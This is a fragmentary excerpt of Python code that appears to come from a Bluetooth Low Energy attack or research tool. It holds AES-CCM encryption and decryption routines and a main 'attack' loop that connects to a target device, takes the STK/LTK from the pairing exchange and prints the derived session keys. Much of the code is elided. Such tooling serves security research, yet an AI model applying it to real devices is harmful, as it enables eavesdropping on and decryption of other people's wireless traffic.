...
def send_encrypted(pkt):
    ...
    pkt_count = bytearray(struct.pack("<Q", conn_tx_packet_counter)[
...
def receive_encrypted(pkt):
    global conn_rx_packet_counter, conn_session_key
    ...
    aes = AES.new(conn_session_key, AES.MODE_CCM, nonce=nonce, mac_len=4)  # mac = mic
    aes.update(bytes([header[0] & 0xE3]))  # Calculate mic over header cleared of NES, SN and MD
...
while attack:
    ...
    if data:
        ...
        if BTLE_SCAN_RSP in pkt and pkt.AdvA == advertiser_address.lower() and connecting == False:
            ...
            master_address_raw = unhexlify(''.join(master_address.split(':')))
            slave_address_raw = unhexlify(''.join(advertiser_address.split(':')))
            ...
            if smp_answer is not None and isinstance(smp_answer, list):
                for res in smp_answer:
                    ...
                    if SM_Hdr in res:
                        ...
                        conn_ltk = res.ltk
                        print(Fore.GREEN + "[!] STK/LTK received from SMP server: " + hexlify(res.ltk).decode().upper())
            ...
            print(Fore.GREEN + 'Received SKD: ' + hexlify(conn_skd).decode())
            print(Fore.GREEN + 'Received  IV: ' + hexlify(conn_iv).decode())
            print(Fore.GREEN + 'Stored   LTK: ' + hexlify(conn_ltk).decode())
            print(Fore.GREEN + 'AES-CCM  Key: ' + hexlify(conn_session_key).decode())
